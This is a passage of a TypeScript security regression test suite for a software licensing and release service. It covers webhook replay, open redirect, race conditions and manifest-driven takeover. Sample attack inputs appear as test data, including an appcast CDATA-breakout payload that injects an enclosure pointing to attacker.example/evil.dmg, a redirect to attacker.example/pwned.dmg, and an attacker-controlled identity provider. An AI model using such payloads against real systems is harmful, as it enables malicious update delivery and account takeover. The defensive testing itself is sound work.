// R6-06 — arch aliases from the router reach ARCH_TOKENS[undefined]
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-06 aarch64 / amd64 route aliases raise an unhandled TypeError", () => {
  const cases: Array<["cli" | "dmg", Arch]> = [
    ["dmg", "aarch64" as Arch],
    ["dmg", "amd64" as Arch],
    ["cli", "aarch64" as Arch],
    ["cli", "amd64" as Arch],
  ];
  // FIXED (R6-08): `normalizeArch` canonicalises the aliases before they reach ARCH_TOKENS,
  // so the aliases resolve to the real arm64/x86_64 asset instead of throwing a 500.
  for (const [kind, arch] of cases) {
    it(`${kind} + ${arch} throws instead of 404`, async () => {
      const db = makeTestDb();
      await seedReleaseConfig(db);
      const rel = release({
        tag_name: "v1.2.3",
        assets: [asset("djdl-arm64.dmg", 100), asset("djdl-arm64", 101)],
      });
      const { fetchImpl } = stubFetch([
        [
          "/releases/tags/",
          () => new Response(JSON.stringify(rel), { status: 200 }),
        ],
        ["/releases/assets/", () => new Response("BINARY", { status: 200 })],
      ]);
      const res = await handleRelease(
        req(`https://key.plrs.im/djdl/${kind}/1.2.3/djdl-${arch}`),
        envFor(),
        db,
        makeProduct(),
        kind,
        { version: "1.2.3", arch },
        fetchImpl,
      );
      // `aarch64` resolves to the arm64 asset; `amd64` has no x86_64 asset here, so 404 —
      // never an unhandled TypeError.
      expect([200, 404]).toContain(res.status);
    });
  }
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-07 — webhook: attacker-chosen ref + no replay protection
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-07 webhook resync trusts payload-supplied ref and has no replay protection", () => {
  // FIXED (R6-05): `resyncRepo` takes no ref at all — the Contents API resolves the
  // DB-configured repo's own default branch, so nothing in the payload steers which
  // commit's `.pkey/` is applied.
  it("payload.after is passed straight through to ?ref= (any branch / PR head / old sha)", async () => {
    const db = makeTestDb();
    const env = envFor();
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });
    expect(
      (await linkRepo(env, db, "acme-org/acme-app", NOW, stub.fetchImpl)).ok,
    ).toBe(true);
    stub.calls.length = 0;

    // A ref that was NEVER reviewed on the default branch.
    const res = await handleGithubWebhook(
      deliveryRequest(
        await signedPush(
          pushPayload({ after: "refs/pull/9/head" }),
          "webhook-secret",
        ),
      ),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    expect(res.status).toBe(200);
    const contents = stub.calls.filter((c) => c.url.includes("/contents/"));
    expect(contents.length).toBeGreaterThan(0);
    expect(contents.every((c) => !c.url.includes("ref="))).toBe(true);
    expect(contents.every((c) => !c.url.includes("pull"))).toBe(true);
  });

  // FIXED (R6-05): a delivery whose `installation.id` does not match the product's stored
  // `gh_installation_id` is refused, so one leaked webhook secret is no longer a
  // cross-tenant forgery capability.
  it("a delivery for the wrong installation id is refused", async () => {
    const db = makeTestDb();
    const env = envFor();
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });
    expect(
      (await linkRepo(env, db, "acme-org/acme-app", NOW, stub.fetchImpl)).ok,
    ).toBe(true);
    await db.run(
      "UPDATE release_config SET binary_name = ? WHERE product = ?",
      "acme-quarantined",
      "acme",
    );
    stub.calls.length = 0;

    const res = await handleGithubWebhook(
      deliveryRequest(
        await signedPush(
          pushPayload({ installation: { id: 999999 } }),
          "webhook-secret",
        ),
      ),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    const body = (await res.json()) as {
      ok: boolean;
      products: Array<{ error?: string }>;
    };
    expect(body.ok).toBe(false);
    expect(body.products[0]?.error).toContain("installation id");
    // No manifest was fetched and the operator's quarantine survived.
    expect(stub.calls.filter((c) => c.url.includes("/contents/"))).toEqual([]);
    expect((await getReleaseConfig(db, "acme"))?.binary_name).toBe(
      "acme-quarantined",
    );
  });

  it("REPLAY: re-posting one captured delivery re-runs the full destructive resync and reverts operator edits", async () => {
    const db = makeTestDb();
    const env = envFor();
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });
    expect(
      (await linkRepo(env, db, "acme-org/acme-app", NOW, stub.fetchImpl)).ok,
    ).toBe(true);

    // Capture ONE valid delivery (body + signature).
    const delivery = await signedPush(pushPayload(), "webhook-secret");
    const first = await handleGithubWebhook(
      deliveryRequest(delivery),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    expect(first.status).toBe(200);

    // An operator responds to an incident: adds a tier and pins the OIDC issuer by hand.
    await db.run(
      `INSERT INTO tiers (product, id, label, profile_id, policy_expiry_days,
         policy_device_limit, channels_json, min_version, max_version,
         policy_fingerprint, modified_by, modified_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?)`,
      "acme",
      "incident-lockdown",
      "Locked",
      null,
      null,
      // Was 0. R11-02: licenseCore gates the seat check on `limit > 0`, so a 0 here meant
      // UNLIMITED devices — the exact opposite of "incident lockdown" — and 0015 now rejects
      // it at the database. 1 is the tightest limit that actually means what this test says.
      1,
      null,
      null,
      null,
      null,
      "operator",
      NOW + 20,
    );
    await db.run(
      "UPDATE release_config SET binary_name = ? WHERE product = ?",
      "acme-quarantined",
      "acme",
    );

    // FIXED (R6-06): the delivery GUID is remembered in KV, so replaying the EXACT same
    // bytes + signature is ignored instead of re-running the destructive resync.
    const replay = await handleGithubWebhook(
      deliveryRequest(delivery),
      env,
      db,
      NOW + 30,
      stub.fetchImpl,
    );
    expect(replay.status).toBe(200);
    expect(await replay.json()).toMatchObject({
      ok: true,
      ignored: "duplicate-delivery",
    });

    // …and the operator's incident response survived.
    const tier = await db.first<{ id: string }>(
      "SELECT id FROM tiers WHERE product = ? AND id = ?",
      "acme",
      "incident-lockdown",
    );
    expect(tier?.id).toBe("incident-lockdown");
    expect((await getReleaseConfig(db, "acme"))?.binary_name).toBe(
      "acme-quarantined",
    );
  });

  // PARTLY FIXED — splitting `.pkey/` into "repo may own" vs "admin only" (access gating,
  // admin_group, tiers) is fix direction #4 of R6-05 and is still open. The one piece that did
  // land is the OIDC issuer: R9-01 gates a *new or changed* `oidc_config.issuer` on the
  // operator's `OIDC_ISSUER_ALLOWLIST` at both ingest paths, and the gate runs before the
  // first write, so a push that tries to introduce an unlisted IdP applies nothing at all.
  it("a webhook push that repoints the IdP at an unlisted host is refused outright", async () => {
    const db = makeTestDb();
    const env = envFor(); // no OIDC_ISSUER_ALLOWLIST — the fail-closed default
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });
    expect(
      (await linkRepo(env, db, "acme-org/acme-app", NOW, stub.fetchImpl)).ok,
    ).toBe(true);

    stub.files[".pkey/product.json"] = ATTACKER_PRODUCT_JSON;

    const res = await handleGithubWebhook(
      deliveryRequest(
        await signedPush(
          pushPayload({ head_commit: { modified: [".pkey/product.json"] } }),
          "webhook-secret",
        ),
      ),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    expect(res.status).toBe(200); // the webhook still ACKs; the resync inside it failed
    const oidc = await db.first<{ issuer: string; client_id: string }>(
      "SELECT * FROM oidc_config WHERE product = ?",
      "acme",
    );
    expect(oidc).toBeNull(); // no IdP introduced
    // ...and because the gate precedes every write, the rest of the hostile manifest — the
    // admin_group takeover included — never landed either.
    const product = await db.first<{ admin_group: string; name: string }>(
      "SELECT admin_group, name FROM products WHERE slug = ?",
      "acme",
    );
    expect(product?.admin_group).toBe("acme-admins");
    const tier = await db.first<{ policy_device_limit: number | null }>(
      "SELECT policy_device_limit FROM tiers WHERE product = ? AND id = ?",
      "acme",
      "pro",
    );
    expect(tier?.policy_device_limit).not.toBe(999);
  });

  // STILL NOT FIXED (R6-05 proper): once the issuer host IS operator-blessed, everything else
  // in `.pkey/product` is still repo-owned with no admin-ownership flag — clientId, tiers and
  // `admin_group` are all rewritten by a push.
  it("a webhook push still rewrites clientId, tiers, and admin_group once the host is allowlisted", async () => {
    const db = makeTestDb();
    const env = envFor();
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    env.OIDC_ISSUER_ALLOWLIST = "idp.attacker.example";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });
    expect(
      (await linkRepo(env, db, "acme-org/acme-app", NOW, stub.fetchImpl)).ok,
    ).toBe(true);

    stub.files[".pkey/product.json"] = ATTACKER_PRODUCT_JSON;

    const res = await handleGithubWebhook(
      deliveryRequest(
        await signedPush(
          pushPayload({ head_commit: { modified: [".pkey/product.json"] } }),
          "webhook-secret",
        ),
      ),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    expect(res.status).toBe(200);
    const oidc = await db.first<{ issuer: string; client_id: string }>(
      "SELECT * FROM oidc_config WHERE product = ?",
      "acme",
    );
    expect(oidc?.issuer).toBe("https://idp.attacker.example");
    expect(oidc?.client_id).toBe("attacker-client");
    const product = await db.first<{ admin_group: string }>(
      "SELECT admin_group FROM products WHERE slug = ?",
      "acme",
    );
    expect(product?.admin_group).toBe("attacker-controlled-group");
  });

  // A7-05. The same push is also the delivery vehicle for an unbounded seat cap: a tier's
  // `policyDeviceLimit` feeds `claimDeviceSeat`'s recursive CTE, which is O(limit) inside a
  // SINGLE statement — so a six-figure limit is not a big number, it is a statement that never
  // returns, on every subsequent activation for that product.
  it("FIXED (A7-05): a repo push cannot raise a tier's seat cap past the ceiling", async () => {
    const db = makeTestDb();
    const env = envFor();
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });
    expect(
      (await linkRepo(env, db, "acme-org/acme-app", NOW, stub.fetchImpl)).ok,
    ).toBe(true);

    stub.files[".pkey/product.json"] = OVERSIZED_LIMIT_PRODUCT_JSON;
    const res = await handleGithubWebhook(
      deliveryRequest(
        await signedPush(
          pushPayload({ head_commit: { modified: [".pkey/product.json"] } }),
          "webhook-secret",
        ),
      ),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    // The webhook still ACKs (it always does); the resync inside it reports the refusal.
    expect(res.status).toBe(200);
    const body = (await res.json()) as {
      products: Array<{ ok: boolean; errors?: string[] }>;
    };
    expect(body.products[0]?.ok).toBe(false);
    // The operator has to be able to see WHY their push did not apply, so the refusal names
    // the offending path and the ceiling, not just "invalid".
    const errors = JSON.stringify(body.products[0]?.errors ?? []);
    expect(errors).toContain("policyDeviceLimit");
    expect(errors).toContain("1000");

    // Reject, never coerce: nothing from the document landed, so there is no clamped-but-
    // applied row to reason about later.
    const tier = await db.first<{ policy_device_limit: number | null }>(
      "SELECT policy_device_limit FROM tiers WHERE product = ? AND id = ?",
      "acme",
      "pro",
    );
    expect(tier?.policy_device_limit ?? 0).toBeLessThan(100_000);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-08 — streamAsset redirect handling
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-08 streamAsset redirect handling", () => {
  it("a relative Location raises an unhandled TypeError instead of a 404", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const rel = release({
      tag_name: "v1.2.3",
      assets: [asset("djdl-arm64", 777)],
    });
    const { fetchImpl } = stubFetch([
      [
        "/releases/tags/",
        () => new Response(JSON.stringify(rel), { status: 200 }),
      ],
      [
        "/releases/assets/777",
        () =>
          new Response(null, {
            status: 302,
            headers: { Location: "/relative/redirect" },
          }),
      ],
    ]);
    await expect(
      handleRelease(
        req("https://key.plrs.im/djdl/cli/1.2.3/djdl-arm64"),
        envFor(),
        db,
        makeProduct(),
        "cli",
        { version: "1.2.3", arch: "arm64" },
        fetchImpl,
      ),
    ).rejects.toThrow(TypeError);
  });

  it("the storage re-fetch is issued WITHOUT redirect:'manual', so further hops are unguarded", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const rel = release({
      tag_name: "v1.2.3",
      assets: [asset("djdl-arm64", 777)],
    });
    const { fetchImpl, calls } = stubFetch([
      [
        "/releases/tags/",
        () => new Response(JSON.stringify(rel), { status: 200 }),
      ],
      [
        "/releases/assets/777",
        () =>
          new Response(null, {
            status: 302,
            headers: { Location: "https://objects.githubusercontent.com/hop1" },
          }),
      ],
      [
        "objects.githubusercontent.com",
        () => new Response("BINARY", { status: 200 }),
      ],
    ]);
    const res = await handleRelease(
      req("https://key.plrs.im/djdl/cli/1.2.3/djdl-arm64"),
      envFor(),
      db,
      makeProduct(),
      "cli",
      { version: "1.2.3", arch: "arm64" },
      fetchImpl,
    );
    expect(res.status).toBe(200);
    const first = calls.find((c) => c.url.includes("/releases/assets/777"));
    const second = calls.find((c) =>
      c.url.includes("objects.githubusercontent.com"),
    );
    expect(first?.init?.redirect).toBe("manual");
    // The second hop uses the default "follow": any onward 302 is taken with no host check.
    expect(second?.init?.redirect).toBeUndefined();
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-09 — latent CDATA breakout in the appcast renderer
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-09 appcast <description> CDATA breakout (latent)", () => {
  it("descriptionHtml is neither escaped nor ]]>-neutralised", () => {
    const xml = renderAppcast({
      channelTitle: "djdl",
      link: "https://key.plrs.im",
      items: [
        {
          title: "djdl 1.2.3",
          shortVersion: "1.2.3",
          build: "1.2.3",
          url: "https://key.plrs.im/djdl/release/dl/1.2.3/djdl-arm64.dmg",
          length: 1,
          pubDate: "Thu, 02 Jan 2026 03:04:05 GMT",
          descriptionHtml:
            ']]></description><enclosure url="https://attacker.example/evil.dmg" /><description><![CDATA[',
        },
      ],
    });
    // The CDATA section is terminated early and a second <enclosure> is injected.
    expect(xml).toContain(
      '<enclosure url="https://attacker.example/evil.dmg" />',
    );
    expect(xml).toContain("]]></description>");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-10 — no downgrade / rollback protection
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-10 downgrade: deleting the newest release silently makes an older one latest", () => {
  it("/version and the appcast follow the release list with no floor and no client-version input", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const env = envFor();

    let releases = [
      release({ tag_name: "v2.0.0" }),
      release({ tag_name: "v1.0.0" }),
    ];
    const fetchImpl: FetchImpl = async (input) => {
      const url = String(input);
      if (url.includes("/access_tokens"))
        return new Response(JSON.stringify({ token: "t" }), { status: 200 });
      if (url.includes("/releases?per_page"))
        return new Response(JSON.stringify(releases), { status: 200 });
      return new Response("nf", { status: 404 });
    };

    const before = await handleRelease(
      req(),
      env,
      db,
      makeProduct(),
      "version",
      { version: "latest" },
      fetchImpl,
    );
    expect(((await before.json()) as { version: string }).version).toBe(
      "2.0.0",
    );

    // The repo owner (or anyone who can delete a release) removes v2.0.0.
    releases = [release({ tag_name: "v1.0.0" })];

    const after = await handleRelease(
      req(),
      env,
      db,
      makeProduct(),
      "version",
      { version: "latest" },
      fetchImpl,
    );
    // Silent downgrade: no floor, no comparison against any client-reported version.
    expect(((await after.json()) as { version: string }).version).toBe("1.0.0");
    // …and the response is cacheable-public with no rollback marker.
    expect(after.headers.get("cache-control")).toContain("public");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-11 — portal /download/<token> open redirect + single-use TOCTOU
// ═════════════════════════════════════════════════════════════════════════════

// RE-BASELINED (P2.T2). This finding — the same defect R6-12 records — was rated **dormant**
// on one ground: `release_artifacts.source_url` had no writer in `src/`, so the missing allowlist
// could not be reached. `services/release/store.ts` gives it one, so the redirect is hardened in
// the same change and the PoC below becomes its regression test.
describe("R6-11 portal download redirect host allowlist", () => {
  it("FIXED: refuses an arbitrary off-platform source_url instead of 302ing to it", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    env.PORTAL_SESSION_SECRET = "test-portal-session-secret";
    await seedProduct(db, SLUG);
    await seedLicenseWithKey(db, SLUG);
    const account = await getOrCreateAccountByEmail(db, "ada@example.com", NOW);
    await syncAccountLicenseLinks(db, account.id, NOW);

    await db.run(
      `INSERT INTO release_metadata
         (product, release_id, version, title, notes, commit_sha, source_url,
          metadata_access, artifacts_access, published_at, metadata_json, created_at, modified_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)`,
      SLUG,
      "rel_1",
      "1.2.3",
      "DJDL 1.2.3",
      null,
      null,
      "https://example.com/releases/1.2.3",
      "public",
      "public",
      NOW,
      null,
      NOW,
      NOW,
    );
    await db.run(
      `INSERT INTO release_artifacts
         (product, release_id, artifact_id, name, kind, platform, arch, content_type,
          size_bytes, sha256, source_url, storage_key, sparkle_signature, access,
          metadata_json, created_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
      SLUG,
      "rel_1",
      "art_1",
      "djdl.dmg",
      "dmg",
      "macos",
      "arm64",
      "application/octet-stream",
      123,
      "sha",
      // The value the finding turned into an open redirect. It is now refused: only an https
      // GitHub storage host may become a `Location` (`portal/api.ts` `redirectableSourceUrl`).
      "https://attacker.example/pwned.dmg",
      null,
      null,
      "public",
      null,
      NOW,
    );

    const token = await createPortalDownloadToken(env, db, {
      accountId: account.id,
      product: SLUG,
      releaseId: "rel_1",
      artifactId: "art_1",
      now: NOW,
    });

    const res = await handlePortalDownload(
      new Request(
        `https://key.plrs.im/download/${token}`,
      ) as unknown as Request,
      env,
      db,
      token,
      NOW + 1,
    );
    expect(res.status).toBe(404);
    expect(res.headers.get("location")).toBeNull();
  });

  // FIXED (R9-05b / R11-05): the single-use marking is a conditional UPDATE now.
  it("TOCTOU: concurrent redemptions of a single-use token — only one wins", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    env.PORTAL_SESSION_SECRET = "test-portal-session-secret";
    await seedProduct(db, SLUG);
    await seedLicenseWithKey(db, SLUG);
    const account = await getOrCreateAccountByEmail(db, "ada@example.com", NOW);
    await syncAccountLicenseLinks(db, account.id, NOW);
    await db.run(
      `INSERT INTO release_metadata
         (product, release_id, version, title, notes, commit_sha, source_url,
          metadata_access, artifacts_access, published_at, metadata_json, created_at, modified_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)`,
      SLUG,
      "rel_1",
      "1.2.3",
      "DJDL 1.2.3",
      null,
      null,
      null,
      "public",
      "public",
      NOW,
      null,
      NOW,
      NOW,
    );
    await db.run(
      `INSERT INTO release_artifacts
         (product, release_id, artifact_id, name, kind, platform, arch, content_type,
          size_bytes, sha256, source_url, storage_key, sparkle_signature, access,
          metadata_json, created_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
      SLUG,
      "rel_1",
      "art_1",
      "djdl.dmg",
      "dmg",
      "macos",
      "arm64",
      "application/octet-stream",
      123,
      "sha",
      // An ALLOWLISTED host, so this test still exercises the single-use race rather than
      // stopping at the host check the test above covers.
      "https://objects.githubusercontent.com/djdl.dmg",
      null,
      null,
      "public",
      null,
      NOW,
    );
    const token = await createPortalDownloadToken(env, db, {
      accountId: account.id,
      product: SLUG,
      releaseId: "rel_1",
      artifactId: "art_1",
      now: NOW,
    });
    // better-sqlite3 is synchronous, so model D1's real async round-trips: every DB call
    // yields to the event loop before running. Nothing about the handler changes.
    const asyncDb = new Proxy(db, {
      get(target, prop, receiver) {
        const value = Reflect.get(target, prop, receiver);
        if (typeof value !== "function") return value;
        return async (...args: unknown[]) => {
          await new Promise((r) => setTimeout(r, 0));
          return (value as (...a: unknown[]) => unknown).apply(target, args);
        };
      },
    }) as Db;

    const fire = (): Promise<Response> =>
      handlePortalDownload(
        new Request(
          `https://key.plrs.im/download/${token}`,
        ) as unknown as Request,
        env,
        asyncDb,
        token,
        NOW + 1,
      );
    // Both still interleave between the `used_at` read and `markPortalDownloadUsed` — the
    // database, not the ordering, is what decides which one gets the redirect.
    const [a, b] = await Promise.all([fire(), fire()]);
    expect([a.status, b.status].sort()).toEqual([302, 404]);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-05 (fix direction #4) — `.pkey/` ingest was a control plane
// ═════════════════════════════════════════════════════════════════════════════
//
// The finding's open half: a push to `.pkey/` on a linked repo's default branch, by anyone with
// write access, with no admin review and no audit row, rewrote security-relevant product state.
// Each test below is one of those rewrites, and each is GREEN when the push FAILS to make it.

/** Catalog with a `serverOnly` secret (worker-consumed) and a `clientScoped` one (delivered). */
const INGEST_ENTRIES: readonly Record<string, unknown>[] = [
  {
    key: "run.concurrency",
    kind: "config",
    category: "Run",
    label: "Concurrency",
    description: "How many downloads run at once.",
    schema: { type: "integer", minimum: 1 },
  },
  {
    key: "api.serverToken",
    kind: "secret",
    category: "Secrets",
    label: "Server token",
    description: "Consumed by the worker; never signed into a device document.",
    schema: { type: "string", minLength: 1 },
    delivery: "serverOnly",
  },
  {
    key: "api.deviceToken",
    kind: "secret",
    category: "Secrets",
    label: "Device token",
    description: "Delivered to the device's keyring.",
    schema: { type: "string", minLength: 1 },
    delivery: "clientScoped",
  },
];

function ingestSchemaJson(
  mutate: (entries: Record<string, unknown>[]) => void = () => {},
): string {
  const entries = JSON.parse(JSON.stringify(INGEST_ENTRIES)) as Record<
    string,
    unknown
  >[];
  mutate(entries);
  return JSON.stringify({ schemaVersion: 1, entries });
}

function ingestProductJson(
  opts: { adminGroup?: string; secretValue?: string } = {},
): string {
  return JSON.stringify({
    slug: "acme",
    name: "Acme",
    compatMin: "1.0.0",
    compatMax: "9.0.0",
    adminGroup: opts.adminGroup ?? "acme-admins",
    licensing: {
      profiles: [
        {
          id: "base",
          name: "Base",
          payload: {
            secrets: {
              "api.deviceToken": {
                state: "enforced",
                value: opts.secretValue ?? "manifest-secret-v1",
                updatedAt: 0,
              },
            },
          },
        },
      ],
      tiers: [{ id: "pro", label: "Pro", profileId: "base" }],
    },
  });
}

/** Link `acme-org/acme-app` with the ingest fixtures; returns the mutable file map. */
async function linkIngest(
  env: Env,
  db: Db,
): Promise<ReturnType<typeof pkeyFetch>> {
  const stub = pkeyFetch({
    ".pkey/schema.json": ingestSchemaJson(),
    ".pkey/product.json": ingestProductJson(),
    ".pkey/release.json": releaseJson(),
  });
  const linked = await linkRepo(
    env,
    db,
    "acme-org/acme-app",
    NOW,
    stub.fetchImpl,
  );
  expect(linked.ok, JSON.stringify(linked)).toBe(true);
  return stub;
}

/** Fire one webhook delivery. `nonce` keeps the delivery GUID distinct across calls. */
async function push(
  env: Env,
  db: Db,
  stub: ReturnType<typeof pkeyFetch>,
  at: number,
  nonce = "0",
): Promise<{ ok: boolean; products: Array<{ ok: boolean; error?: string }> }> {
  const res = await handleGithubWebhook(
    deliveryRequest(
      await signedPush(
        pushPayload({ after: nonce.padEnd(40, "0") }),
        "webhook-secret",
      ),
    ),
    env,
    db,
    at,
    stub.fetchImpl,
  );
  expect(res.status).toBe(200);
  return (await res.json()) as {
    ok: boolean;
    products: Array<{ ok: boolean; error?: string }>;
  };
}

async function activeCatalog(db: Db): Promise<string | undefined> {
  const row = await db.first<{ catalog_json: string }>(
    "SELECT catalog_json FROM product_schema WHERE product = ? AND active = 1",
    "acme",
  );
  return row?.catalog_json;
}

async function profilePayload(db: Db): Promise<string | undefined> {
  const row = await db.first<{ payload_json: string }>(
    "SELECT payload_json FROM profiles WHERE product = ? AND id = ?",
    "acme",
    "base",
  );
  return row?.payload_json;
}

async function auditRows(
  db: Db,
): Promise<Array<{ action: string; target_id: string | null }>> {
  return db.all<{ action: string; target_id: string | null }>(
    "SELECT action, target_id FROM audit WHERE product = ? ORDER BY target_id",
    "acme",
  );
}

function envWithWebhook(): Env {
  const env = envFor();
  env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
  return env;
}

describe("R6-05 .pkey/ ingest rewrites security state with no review", () => {
  // FIXED: `serverOnly` is the declaration that keeps a secret out of every signed document
  // (`core/payload.ts`'s prune). Withdrawing it in a repo file made the platform hand the value
  // out signed on the very next document poll.
  it("a push that reclassifies a serverOnly secret is refused and the catalog is unchanged", async () => {
    const db = makeTestDb();
    const env = envWithWebhook();
    const stub = await linkIngest(env, db);
    const before = await activeCatalog(db);

    stub.files[".pkey/schema.json"] = ingestSchemaJson((entries) => {
      entries[1]!.delivery = "clientScoped";
    });
    const body = await push(env, db, stub, NOW + 10, "1");

    expect(body.ok).toBe(false);
    expect(body.products[0]?.error).toContain("api.serverToken");
    expect(await activeCatalog(db)).toBe(before);
  });

  it("a push that DELETES a serverOnly secret from the catalog is refused too", async () => {
    const db = makeTestDb();
    const env = envWithWebhook();
    const stub = await linkIngest(env, db);
    const before = await activeCatalog(db);

    stub.files[".pkey/schema.json"] = ingestSchemaJson((entries) =>
      entries.splice(1, 1),
    );
    const body = await push(env, db, stub, NOW + 10, "2");

    expect(body.ok).toBe(false);
    expect(body.products[0]?.error).toContain("api.serverToken");
    expect(await activeCatalog(db)).toBe(before);
  });

  // The guard is ONE-DIRECTIONAL: tightening must stay possible, or the check would freeze
  // every catalog that ever declared a serverOnly key.
  it("a push that ADDS a serverOnly secret still applies", async () => {
    const db = makeTestDb();
    const env = envWithWebhook();
    const stub = await linkIngest(env, db);

    stub.files[".pkey/schema.json"] = ingestSchemaJson((entries) => {
      entries[2]!.delivery = "serverOnly";
      entries.push({
        key: "api.extraToken",
        kind: "secret",
        category: "Secrets",
        label: "Extra token",
        description: "",
        schema: { type: "string", minLength: 1 },
        delivery: "serverOnly",
      });
    });
    const body = await push(env, db, stub, NOW + 10, "3");

    expect(body.ok).toBe(true);
    expect(await activeCatalog(db)).toContain("api.extraToken");
  });

  // FIXED: `release_config`'s two access columns carry an owner (0022). They decide who may
  // read the update feed and who may download a build, and a resync used to reset them from
  // `.pkey/release` on every push — so an operator's `licensed` became `public` again.
  it("a push cannot flip an admin-set artifacts_access back to public", async () => {
    const db = makeTestDb();
    const env = envWithWebhook();
    const stub = await linkIngest(env, db);

    // The operator narrows downloads in the console.
    await setReleaseAccess(db, "acme", { artifacts: "licensed" }, "admin");

    // The repo pushes a manifest that says both modes are wide open.
    stub.files[".pkey/release.json"] = releaseJson({
      access: { metadata: "authenticated", artifacts: "public" },
    });
    const body = await push(env, db, stub, NOW + 10, "4");
    expect(body.ok).toBe(true);

    const cfg = await getReleaseConfig(db, "acme");
    // The admin-owned column survived…
    expect(cfg?.artifacts_access).toBe("licensed");
    // …and ownership is PER COLUMN, so the one the operator never touched still tracks the repo.
    expect(cfg?.metadata_access).toBe("authenticated");
  });

  // FIXED: the Sparkle key is what proves a DMG is authentic — every `.sig` sidecar is verified
  // against it. Swapping it in a repo file makes the attacker's own signature the accepted one.
  it("a push cannot replace a stored sparkle_ed25519_pub", async () => {
    const db = makeTestDb();
    const env = envWithWebhook();
    const stub = await linkIngest(env, db);
    expect((await getReleaseConfig(db, "acme"))?.sparkle_ed25519_pub).toBe(
      "PUBKEY==",
    );

    stub.files[".pkey/release.json"] = releaseJson({
      sparkleEd25519Pub: "ATTACKERKEY==",
      binaryName: "acme-pwned",
    });
    const body = await push(env, db, stub, NOW + 10, "5");

    expect(body.ok).toBe(false);
    expect(body.products[0]?.error).toContain("Sparkle public key");
    const cfg = await getReleaseConfig(db, "acme");
    expect(cfg?.sparkle_ed25519_pub).toBe("PUBKEY==");
    // The refusal precedes every write, so nothing else in the manifest landed either.
    expect(cfg?.binary_name).toBe("acme");
  });

  // FIXED (R12-02's missing half): `applyOverrides` sealed catalog secrets, but only the CONSOLE
  // reached it. Both manifest paths wrote `JSON.stringify(p.payload)` verbatim.
  it("a manifest-supplied secret is sealed at rest, not stored in cleartext", async () => {
    const db = makeTestDb();
    const env = envWithWebhook();
    await linkIngest(env, db);

    const stored = await profilePayload(db);
    expect(stored).toBeDefined();
    expect(stored).not.toContain("manifest-secret-v1");

    const entry = (
      JSON.parse(stored!) as {
        secrets: Record<string, { value: unknown }>;
      }
    ).secrets["api.deviceToken"]!;
    expect(isSealedEnvelope(entry.value)).toBe(true);
    expect(
      await openManagedValue(env, "acme", "api.deviceToken", entry.value),
    ).toBe("manifest-secret-v1");
  });

  it("a push cannot overwrite a sealed stored secret with its own value", async () => {
    const db = makeTestDb();
    const env = envWithWebhook();
    const stub = await linkIngest(env, db);
    const before = await profilePayload(db);

    stub.files[".pkey/product.json"] = ingestProductJson({
      secretValue: "attacker-rotated-value",
    });
    const body = await push(env, db, stub, NOW + 10, "6");

    expect(body.ok).toBe(false);
    expect(body.products[0]?.error).toContain("api.deviceToken");
    // Byte-identical: the refusal ran before the first write.
    expect(await profilePayload(db)).toBe(before);
  });

  // FIXED: `grep -n audit resync.ts githubWebhook.ts` used to return nothing at all.
  it("a resync that changes product state writes one audit row per changed field", async () => {
    const db = makeTestDb();
    const env = envWithWebhook();
    const stub = await linkIngest(env, db);

    stub.files[".pkey/product.json"] = ingestProductJson({
      adminGroup: "attacker-controlled-group",
    });
    const body = await push(env, db, stub, NOW + 10, "7");
    expect(body.ok).toBe(true);

    const rows = await auditRows(db);
    expect(rows.length).toBeGreaterThan(0);
    expect(rows.every((r) => r.action === "release.resync.field")).toBe(true);
    expect(rows.map((r) => r.target_id)).toContain("products.admin_group");
    // A field the push did NOT move gets no row.
    expect(rows.map((r) => r.target_id)).not.toContain("products.name");
  });

